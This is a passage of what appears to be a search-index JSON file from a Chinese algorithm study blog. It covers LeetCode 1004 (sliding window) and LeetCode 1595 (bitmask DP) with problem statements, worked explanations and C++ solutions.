\u7ffb\u8f6c\u5230 1\uff0c\u6700\u957f\u7684\u5b50\u6570\u7ec4\u957f\u5ea6\u4e3a 6\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#15-sample-input-2","text":"\u8f93\u5165\uff1aA = [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K = 3","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#16-sample-output-2","text":"\u8f93\u51fa\uff1a10 \u89e3\u91ca\uff1a [0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1] \u7c97\u4f53\u6570\u5b57\u4ece 0 \u7ffb\u8f6c\u5230 1\uff0c\u6700\u957f\u7684\u5b50\u6570\u7ec4\u957f\u5ea6\u4e3a 10\u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#17-note","text":"1 <= A.length <= 20000 0 <= K <= A.length A[i] \u4e3a 0 \u6216 1","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#18-source","text":"LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#2","text":"\u6ed1\u52a8\u7a97\u53e3\u3001\u5c3a\u53d6\u6cd5\u3002\u7edf\u8ba1\u7a97\u53e3\u5185 0 \u7684\u6570\u91cf\u662f\u5426\u5927\u4e8e K \uff0c\u5927\u4e8e K \u5219\u51cf\u5c0f\u7a97\u53e3\u5927\u5c0f\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#3","text":"class Solution { public: int longestOnes(vector<int>& A, int K) { queue<int> qu; int count = 0; size_t ans = 0; size_t len = A.size(); // \u5c3a\u53d6 for (size_t i = 0; i < len; i++) { // \u653e\u5165\u961f\u5217 qu.push(A[i]); // \u8bb0\u5f55\u961f\u5217\u4e2d0\u7684\u6570\u91cf if (A[i] == 0) count++; // \u5f530\u7684\u6570\u91cf\u5927\u4e8eK\u65f6\uff0c\u51fa\u961f while (count > K) { if (qu.front() == 0) count--; qu.pop(); } // \u8bb0\u5f55\u961f\u5217\u6700\u5927\u957f\u5ea6 ans = max(ans, qu.size()); } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/","text":"LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c # \u76ee\u5f55 # LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 2.1. \u89e3\u6cd5\u4e00 2.2. \u89e3\u6cd5\u4e8c 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u4f60\u4e24\u7ec4\u70b9\uff0c\u5176\u4e2d\u7b2c\u4e00\u7ec4\u4e2d\u6709 size1 \u4e2a\u70b9\uff0c\u7b2c\u4e8c\u7ec4\u4e2d\u6709 size2 \u4e2a\u70b9\uff0c\u4e14 size1 >= size2 \u3002 \u4efb\u610f\u4e24\u70b9\u95f4\u7684\u8fde\u63a5\u6210\u672c cost \u7531\u5927\u5c0f\u4e3a size1 x size2 \u77e9\u9635\u7ed9\u51fa\uff0c\u5176\u4e2d cost[i][j] \u662f\u7b2c\u4e00\u7ec4\u4e2d\u7684\u70b9 i \u548c\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u70b9 j \u7684\u8fde\u63a5\u6210\u672c\u3002\u5982\u679c\u4e24\u4e2a\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u90fd\u4e0e\u53e6\u4e00\u7ec4\u4e2d\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u70b9\u8fde\u63a5\uff0c\u5219\u79f0\u8fd9\u4e24\u7ec4\u70b9\u662f\u8fde\u901a\u7684\u3002\u6362\u8a00\u4e4b\uff0c\u7b2c\u4e00\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u5fc5\u987b\u81f3\u5c11\u4e0e\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u4e00\u4e2a\u70b9\u8fde\u63a5\uff0c\u4e14\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u5fc5\u987b\u81f3\u5c11\u4e0e\u7b2c\u4e00\u7ec4\u4e2d\u7684\u4e00\u4e2a\u70b9\u8fde\u63a5\u3002 \u8fd4\u56de\u8fde\u901a\u4e24\u7ec4\u70b9\u6240\u9700\u7684\u6700\u5c0f\u6210\u672c\u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1acost = [[15, 96], [36, 2]] 1.4. Sample Output 1 # \u8f93\u51fa\uff1a17 \u89e3\u91ca\uff1a\u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u4f73\u65b9\u6cd5\u662f\uff1a 1--A 2--B \u603b\u6210\u672c\u4e3a 17 \u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1acost = [[1, 3, 5], [4, 1, 1], [1, 5, 3]] 1.6. Sample Output 2 # \u8f93\u51fa\uff1a4 \u89e3\u91ca\uff1a\u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u4f73\u65b9\u6cd5\u662f\uff1a 1--A 2--B 2--C 3--A \u6700\u5c0f\u6210\u672c\u4e3a 4 \u3002 \u8bf7\u6ce8\u610f\uff0c\u867d\u7136\u6709\u591a\u4e2a\u70b9\u8fde\u63a5\u5230\u7b2c\u4e00\u7ec4\u4e2d\u7684\u70b9 2 \u548c\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u70b9 A \uff0c\u4f46\u7531\u4e8e\u9898\u76ee\u5e76\u4e0d\u9650\u5236\u8fde\u63a5\u70b9\u7684\u6570\u76ee\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5173\u5fc3\u6700\u4f4e\u603b\u6210\u672c\u3002 1.7. Source # LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c 2. \u89e3\u8bfb # \u72b6\u6001\u538b\u7f29 DP \u3002 2.1. \u89e3\u6cd5\u4e00 # \u4ee5\u8f93\u5165 cost = [[1, 3, 5], [4, 1, 1], [1, 5, 3]] \u4e3a\u4f8b\u3002 dp[i][state] \u8868\u793a \u524d i \u884c \u5728\u6bcf\u4e00\u884c\u90fd\u81f3\u5c11\u6709\u4e00\u6761\u8fb9\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b \u6784\u6210\u8fde\u63a5\u72b6\u6001 state \u7684\u6700\u5c0f\u6210\u672c\u3002 (i, state) (001)_B (010)_B (011)_B (100)_B (101)_B (110)_B (111)_B 1 1 3 4 5 6 8 9 2 5 4 2 6 2 4 3 3 6 9 3 9 3 7 4 \\text{\u88681 \u72b6\u6001\u793a\u4f8b} \u9996\u5148\u5bf9\u6bcf\u4e00\u884c i \u7684\u6bcf\u4e2a\u72b6\u6001 state \u8fdb\u884c\u904d\u5386\uff0c\u8fde\u63a5\u4e0b\u4e00\u884c\u7684\u67d0\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u8fde\u63a5\u6210\u4e0b\u4e00\u4e2a\u72b6\u6001\u7684\u6700\u5c0f\u6210\u672c\u3002 temp[nextState] = min(temp[nextState], dp[state] + cost[i][j] \u63a5\u4e0b\u6765\u5bf9\u6bcf\u4e2a\u72b6\u6001 state \u8fdb\u884c\u53cd\u8f6c\uff0c\u5f97\u5230\u53cd\u8f6c\u540e\u7684\u72b6\u6001 flipState \uff0c\u7136\u540e\u679a\u4e3e flipState \u7684\u5b50\u72b6\u6001 subState = w \\& flipState \uff0c w \\in [1, flipState] \uff0c\u5c06\u5b50\u72b6\u6001\u548c\u539f\u72b6\u6001\u76f8\u6216\uff0c\u5f97\u5230\u65b0\u72b6\u6001 newState = state | subState \uff0c\u5c1d\u8bd5\u6839\u636e newState \u8fde\u63a5\u65b0\u7684\u8fb9\uff0c\u5f97\u5230\u65b0\u8fb9\u7684\u6743\u503c sum \uff0c\u53d6\u6700\u5c0f\u503c\u3002 temp[nextState] = min(temp[nextState], dp[state] + sum) 2.2. \u89e3\u6cd5\u4e8c # dp[i][s] \u8868\u793a\u5de6\u8fb9\u524d i \u4e2a\u70b9\uff0c\u53f3\u8fb9\u70b9\u8fde\u63a5\u72b6\u51b5\u4e3a s \u7684\u6700\u5c0f cost \u3002 \u4e09\u91cd\u5faa\u73af\uff0c\u548c Floyd \u7b97\u6cd5\u7684\u601d\u60f3\u6709\u70b9\u7c7b\u4f3c\u3002 Floyd \u7b97\u6cd5\u662f\u904d\u5386\u6bcf\u4e2a\u70b9\uff0c\u5224\u65ad\u628a\u8fd9\u4e2a\u70b9\u4f5c\u4e3a\u67d0\u6761\u8def\u5f84\u7684\u4e2d\u95f4\u7ed3\u70b9\u662f\u5426\u80fd\u7f29\u77ed\u8def\u5f84\u957f\u5ea6\u3002 \u8fd9\u91cc\u662f\u904d\u5386\u53f3\u8fb9\u7684\u6bcf\u4e2a\u70b9\uff0c\u5224\u65ad\u628a\u5b83\u548c i - 1 \u70b9 \u76f8\u8fde\u7684\u6700\u5c0f\u6210\u672c\uff0c\u5373\u5c06 cost[i - 1][j] \u4e0e dp[i - 1][s] \u6216 dp[i][s] \u76f8\u52a0\u6240\u5f97\u7684\u548c\u7684\u6700\u5c0f\u503c\u3002 \u6bd4\u5982 \u88681 \u4e2d\u7684 dp[2][(111)B] \uff0c\u53ef\u4ee5\u7531 dp[1][(011)B] + cost[1][2] \u5f97\u5230\uff0c\u4e5f\u53ef\u4ee5\u7531 dp[2][(011)B] + cost[1][2] \u5f97\u5230\uff0c\u7531\u4e8e dp[2][(011)B] < dp[1][(011)B] \uff0c\u6700\u7ec8\u7ed3\u679c\u4e3a 3 \u3002 for (int i = 1; i <= n; i++) // \u679a\u4e3e\u5de6\u8fb9\u6bcf\u4e2a\u70b9 for (int s = 0; s < lim; s++) // \u679a\u4e3e\u53f3\u8fb9\u7684\u8fde\u63a5\u72b6\u6001 for (int j = 0; j < m; j++) // \u679a\u4e3e\u8fde\u63a5\u53f3\u8fb9\u7684\u70b9 // \u8fde\u63a5\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u65b0\u72b6\u6001 dp[i][s | (1 << j)] = min({ dp[i][s | (1 << j)], dp[i - 1][s] + cost[i - 1][j], // \u7528\u524di-1\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 dp[i][s] + cost[i - 1][j] }); // \u7528\u524di\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 3. \u4ee3\u7801 # \u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 // \u89e3\u6cd5\u4e00 class Solution { public: int connectTwoGroups(vector<vector<int>>& cost) { int size1 = cost.size(), size2 = cost[0].size(), stateNum = 1 << size2; //stateNum\u4e3a\u7b2c\u4e8c\u7ec4\u603b\u7684\u72b6\u6001\u6570+1 vector<int> dp(stateNum, INT_MAX); //dp\u6570\u7ec4\u521d\u59cb\u5316\u4e3a\u5f88\u5927\u7684\u6570 dp[0] = 0; //\u521d\u59cb\u72b6\u6001 for (int i = 0; i < size1; ++i) { //\u8fed\u4ee3\u6bcf\u4e00\u884c vector<int> temp(stateNum, INT_MAX); //\u6eda\u52a8\u6570\u7ec4 for (int state = 0; state < stateNum; ++state) { //\u679a\u4e3e\u6240\u6709\u72b6\u6001 if (dp[state] == INT_MAX) continue; //\u82e5\u72b6\u6001\u4e0d\u53ef\u8fbe\uff0ccontinue for (int j = 0; j < size2; ++j) { //\u65b9\u6848\u4e00\uff1a\u4efb\u9009\u4e00\u6761\u8fb9\u76f8\u8fde int nextState = state | (1 << j); //\u76f8\u8fde\u540e\u5230\u8fbe\u7684\u72b6\u6001 temp[nextState] = min(temp[nextState], dp[state] + cost[i][j]); //\u66f4\u65b0\u6700\u5c0f\u82b1\u8d39 } int flipState = (stateNum - 1) ^ state; //\u65b9\u6848\u4e8c\uff1a\u8fde\u63a5\u82e5\u5e72\u672a\u8fde\u63a5\u7684\u8fb9\uff0c\u4f7f\u7528\u5f02\u6216\u8fdb\u884c\u4f4d\u53cd\u8f6c\u5f97\u5230\u6240\u6709\u672a\u8fde\u63a5\u7684\u8fb9 for (int subState = flipState; subState; subState = flipState & (subState - 1)) { //\u679a\u4e3e\u672a\u8fde\u63a5\u7684\u8fb9\u7684\u5b50\u96c6 int nextState = state | subState; //\u76f8\u8fde\u540e\u5230\u8fbe\u7684\u72b6\u6001 if (nextState > state) { // \u82e5\u6dfb\u52a0\u4e86\u65b0\u8fb9 int sum = 0; //\u8bb0\u5f55\u82b1\u8d39 for (int k = 0; k < size2; ++k) //\u679a\u4e3esize2 if (subState & (1 << k)) sum += cost[i][k]; //\u82e5\u5b50\u96c6\u4e2d\u5b58\u5728\u8be5\u8fb9\uff0c\u5219\u66f4\u65b0\u82b1\u8d39 temp[nextState] = min(temp[nextState], dp[state] + sum); //\u66f4\u65b0\u6700\u5c0f\u82b1\u8d39 } } } dp = move(temp); //\u6eda\u52a8\u6570\u7ec4 } return dp.back(); //\u8fd4\u56de\u7ed3\u679c } }; \u4ee3\u7801\u53c2\u8003\u81ea \u53e6\u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 // \u89e3\u6cd5\u4e8c int dp[15][1 << 12 + 5]; class Solution { public: int connectTwoGroups(vector<vector<int>>& cost) { int n = cost.size(), m = cost[0].size(); int lim = 1 << m; // \u521d\u59cb\u5316 for (int i = 0; i <= n; i++) for (int s = 0; s < lim; ++s) dp[i][s] = INT_MAX; dp[0][0] = 0; // DP for (int i = 1; i <= n; i++) // \u679a\u4e3e\u5de6\u8fb9\u6bcf\u4e2a\u70b9 for (int s = 0; s < lim; s++) // \u679a\u4e3e\u53f3\u8fb9\u7684\u8fde\u63a5\u72b6\u6001 for (int j = 0; j < m; j++) // \u679a\u4e3e\u8fde\u63a5\u53f3\u8fb9\u7684\u70b9 // \u8fde\u63a5\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u65b0\u72b6\u6001 dp[i][s | (1 << j)] = min({ dp[i][s | (1 << j)], dp[i - 1][s] + cost[i - 1][j], // \u7528\u524di-1\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 dp[i][s] + cost[i - 1][j] }); // \u7528\u524di\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 return dp[n][lim - 1]; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#leetcode-1595","text":"","title":"LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#_1","text":"LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 2.1. \u89e3\u6cd5\u4e00 2.2. \u89e3\u6cd5\u4e8c 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#12-problem-description","text":"\u7ed9\u4f60\u4e24\u7ec4\u70b9\uff0c\u5176\u4e2d\u7b2c\u4e00\u7ec4\u4e2d\u6709 size1 \u4e2a\u70b9\uff0c\u7b2c\u4e8c\u7ec4\u4e2d\u6709 size2 \u4e2a\u70b9\uff0c\u4e14 size1 >= size2 \u3002 \u4efb\u610f\u4e24\u70b9\u95f4\u7684\u8fde\u63a5\u6210\u672c cost \u7531\u5927\u5c0f\u4e3a size1 x size2 \u77e9\u9635\u7ed9\u51fa\uff0c\u5176\u4e2d cost[i][j] \u662f\u7b2c\u4e00\u7ec4\u4e2d\u7684\u70b9 i \u548c\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u70b9 j \u7684\u8fde\u63a5\u6210\u672c\u3002\u5982\u679c\u4e24\u4e2a\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u90fd\u4e0e\u53e6\u4e00\u7ec4\u4e2d\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u70b9\u8fde\u63a5\uff0c\u5219\u79f0\u8fd9\u4e24\u7ec4\u70b9\u662f\u8fde\u901a\u7684\u3002\u6362\u8a00\u4e4b\uff0c\u7b2c\u4e00\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u5fc5\u987b\u81f3\u5c11\u4e0e\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u4e00\u4e2a\u70b9\u8fde\u63a5\uff0c\u4e14\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u70b9\u5fc5\u987b\u81f3\u5c11\u4e0e\u7b2c\u4e00\u7ec4\u4e2d\u7684\u4e00\u4e2a\u70b9\u8fde\u63a5\u3002 \u8fd4\u56de\u8fde\u901a\u4e24\u7ec4\u70b9\u6240\u9700\u7684\u6700\u5c0f\u6210\u672c\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#13-sample-input-1","text":"\u8f93\u5165\uff1acost = [[15, 96], [36, 2]]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#14-sample-output-1","text":"\u8f93\u51fa\uff1a17 \u89e3\u91ca\uff1a\u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u4f73\u65b9\u6cd5\u662f\uff1a 1--A 2--B \u603b\u6210\u672c\u4e3a 17 \u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#15-sample-input-2","text":"\u8f93\u5165\uff1acost = [[1, 3, 5], [4, 1, 1], [1, 5, 3]]","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#16-sample-output-2","text":"\u8f93\u51fa\uff1a4 \u89e3\u91ca\uff1a\u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u4f73\u65b9\u6cd5\u662f\uff1a 1--A 2--B 2--C 3--A \u6700\u5c0f\u6210\u672c\u4e3a 4 \u3002 \u8bf7\u6ce8\u610f\uff0c\u867d\u7136\u6709\u591a\u4e2a\u70b9\u8fde\u63a5\u5230\u7b2c\u4e00\u7ec4\u4e2d\u7684\u70b9 2 \u548c\u7b2c\u4e8c\u7ec4\u4e2d\u7684\u70b9 A \uff0c\u4f46\u7531\u4e8e\u9898\u76ee\u5e76\u4e0d\u9650\u5236\u8fde\u63a5\u70b9\u7684\u6570\u76ee\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5173\u5fc3\u6700\u4f4e\u603b\u6210\u672c\u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#17-source","text":"LeetCode 1595 \u8fde\u901a\u4e24\u7ec4\u70b9\u7684\u6700\u5c0f\u6210\u672c","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#2","text":"\u72b6\u6001\u538b\u7f29 DP \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#21","text":"\u4ee5\u8f93\u5165 cost = [[1, 3, 5], [4, 1, 1], [1, 5, 3]] \u4e3a\u4f8b\u3002 dp[i][state] \u8868\u793a \u524d i \u884c \u5728\u6bcf\u4e00\u884c\u90fd\u81f3\u5c11\u6709\u4e00\u6761\u8fb9\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b \u6784\u6210\u8fde\u63a5\u72b6\u6001 state \u7684\u6700\u5c0f\u6210\u672c\u3002 (i, state) (001)_B (010)_B (011)_B (100)_B (101)_B (110)_B (111)_B 1 1 3 4 5 6 8 9 2 5 4 2 6 2 4 3 3 6 9 3 9 3 7 4 \\text{\u88681 \u72b6\u6001\u793a\u4f8b} \u9996\u5148\u5bf9\u6bcf\u4e00\u884c i \u7684\u6bcf\u4e2a\u72b6\u6001 state \u8fdb\u884c\u904d\u5386\uff0c\u8fde\u63a5\u4e0b\u4e00\u884c\u7684\u67d0\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u8fde\u63a5\u6210\u4e0b\u4e00\u4e2a\u72b6\u6001\u7684\u6700\u5c0f\u6210\u672c\u3002 temp[nextState] = min(temp[nextState], dp[state] + cost[i][j] \u63a5\u4e0b\u6765\u5bf9\u6bcf\u4e2a\u72b6\u6001 state \u8fdb\u884c\u53cd\u8f6c\uff0c\u5f97\u5230\u53cd\u8f6c\u540e\u7684\u72b6\u6001 flipState \uff0c\u7136\u540e\u679a\u4e3e flipState \u7684\u5b50\u72b6\u6001 subState = w \\& flipState \uff0c w \\in [1, flipState] \uff0c\u5c06\u5b50\u72b6\u6001\u548c\u539f\u72b6\u6001\u76f8\u6216\uff0c\u5f97\u5230\u65b0\u72b6\u6001 newState = state | subState \uff0c\u5c1d\u8bd5\u6839\u636e newState 